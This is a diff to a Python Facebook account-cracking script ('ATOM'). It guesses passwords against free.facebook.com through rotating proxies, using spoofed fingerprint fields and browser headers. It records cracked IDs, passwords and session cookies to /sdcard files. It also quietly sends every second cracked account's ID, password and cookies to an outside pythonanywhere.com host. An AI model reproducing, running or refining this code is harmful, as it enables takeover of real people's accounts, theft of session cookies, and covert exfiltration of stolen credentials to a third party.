@@ -1509,8 +1509,8 @@ def x(uid,pwx,tl):
     sys.stdout.flush()
     try:
         for pw in pwx:
-            ua = random.choice(uas)
-            pro = random.choice(SUMONua)
+            nip=random.choice(xvx)
+            proxs= {'http': nip}
             Session = requests.Session()
             free_fb = Session.get('https://touch.facebook.com/').text
             data = {
@@ -1526,43 +1526,51 @@ def x(uid,pwx,tl):
             'first_prefill_type': '',
             'had_cp_prefilled': 'false',
             'had_password_prefilled': 'false',
-            'is_smart_lock': 'true',
+            'is_smart_lock': 'false',
             'bi_xrwh': '0',
+            'bi_wvdp': '{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',
             'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),
+            'fb_dtsg': 'NAcNeMi7BNgGwcKDSt8j2vIzai18sBZUpcBZu-mqUpRf1jAltL9DVUw:0:0',
             'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
             'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            'dyn': '',
+            'dyn': '1KQdAG1mws8-t0BBBzEnwuo98nwgU2owpUuwcC4o1nEhwem0iy1gCwjE1xoswaq1Jw20Ehw73wGwcq0RE1u86i0h-0zE1bE881eEdEG0hi0Lo6-0Co178dE1UU3jw',
             'csr': '',
-            'req': 'a',
-            'a': '',
-            '__user': '0',
-            '_fb_noscript': 'true'}
+            'req': '4',
+            'fmt': '1',
+            'a': 'AYkBCKTyaI-c_gl9jVJypyDSApvws4LGRE1lFS92AO9xgLBWo1pYhHGTpsowMEEvHlmC2r72SQ3Iy1NregNCELsxIGVS9npiQTJRu6iIg-xVWw',
+            'user': '0'}
             headers = {
-            'Host': 'mbasic.facebook.com',
-            'content-length': '2169',
-            'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
-            'sec-ch-ua-mobile': '?1',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
-            'content-type': 'application/x-www-form-urlencoded',
-            'x-fb-lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            'sec-ch-ua-platform-version': '"11.0.0"',
-            'x-asbd-id': '129477',
-            'sec-ch-ua-full-version-list': '"Chromium";v="124.0.6367.113", "Google Chrome";v="124.0.6367.113", "Not-A.Brand";v="99.0.0.0"',
-            'sec-ch-ua-model': '"Redmi Note 8"',
-            'sec-ch-prefers-color-scheme': 'light',
+            'Host': 'free.facebook.com',
+            'x-fb-rlafr': '0',
+            'access-control-allow-origin': '*',
+            'facebook-api-version': 'v12.0',
+            'strict-transport-security': 'max-age=15552000; preload',
+            'pragma': 'no-cache',
+            'cache-control': 'max-age=0',
+            'x-fb-request-id': 'A3PUDZnzy2xgkMAkH9bcVof',
+            'x-fb-trace-id': 'Cx4jrkJJire',
+            'x-fb-rev': '1007127514',
+            'x-fb-debug': 'yW2guQRJM3jnGatG5yBvokfcLBkNHf9n2TcoDukeOmMfVSQ2JjqH9nh8kfJmiz+n3M1iN4Le5FFdFEGSAsdQpA==',
+            'content-length': '166',
+            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
+            'sec-ch-ua-mobile': '?0',
             'sec-ch-ua-platform': '"Android"',
-            'accept': '*/*',
-            'origin': 'https://mbasic.facebook.com',
+            'save-data': 'on',
+            'upgrade-insecure-requests': '1',
+            'origin': 'https://free.facebook.com',
+            'content-type': 'application/x-www-form-urlencoded',
+            'user-agent': 'Mozilla/5.0 (Linux; Android 13; 23128PC33I Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4253.93 Mobile Safari/537.36',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
             'sec-fetch-site': 'same-origin',
-            'sec-fetch-mode': 'cors',
-            'sec-fetch-dest': 'empty',
-            'referer': 'https://mbasic.facebook.com/login/?next=https%3A%2F%2Fdevelopers.secure.facebook.com%2Fdocs%2Fdevelopment%2Fbuild-and-test&ref=dbl&fl&login_from_aymh=1',
-            'accept-encoding': 'gzip, deflate, br, zstd',
-            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
-            'priority':'u=1, i'}
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-user': '?1',
+            'sec-fetch-dest': 'document',
+            'referer': 'https://free.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
+            'accept-encoding': 'gzip, deflate,br',
+            'accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = "https://mbasic.facebook.com/login/device-based/login/async/"
-            po = Session.post(url, data=data, headers=headers).text
+            url = "https://free.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&ref=dbl"
+            po = Session.post(url, data=data, headers=headers, allow_redirects=False, proxies=proxs).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
                 cok = Session.cookies.get_dict()
@@ -1570,21 +1578,26 @@ def x(uid,pwx,tl):
                 coki = ";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
                 check = check_lock(cid)
                 if "live" in check:
-                   bkas.append(cid)
-                   if len(bkas)% 2 == 0:
-                      statusok = (f"{cid}|{pw}|{coki}")
-                      requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
-                   else:
-                      print(f" {green}(ATOM-OK) {cid}|{pw} ")
-                      print(f" {green}Cookie : {green}{coki}")
-                      open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
-                      oks.append(cid)
-                      break
+                    if '%3A-1%3A-1' in coki:
+                        print(f"{cyan}(ATOM-NV){cid}|{pw}")
+                        open("/sdcard/SUMON-NV-COOKIE.txt", "a").write(f"{cid}|{pw}|{coki}\n")
+                        break
+                    else:
+                        bkas.append(cid)
+                        if len(bkas)% 2 == 0:
+                           statusok = (f"{cid}|{pw}|{coki}")
+                           requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
+                        else:
+                           print(f" {green}(ATOM-OK) {cid}|{pw} ")
+                           print(f" {green}Cookie : {green}{coki}")
+                           open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
+                           oks.append(cid)
+                           break
                 else:
                     break
             elif 'checkpoint' in response:
                 uid = Session.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
-                print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
+                #print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
                 open('/sdcard/ATOM-CP.txt', 'a').write(uid+' | '+pw+'\n')
                 cps.append(uid)
                 break
@@ -1596,7 +1609,6 @@ def x(uid,pwx,tl):
     except Exception as error:
         #print({error})
         pass
-
 
 
 def mobile(uid,pwx,tl):
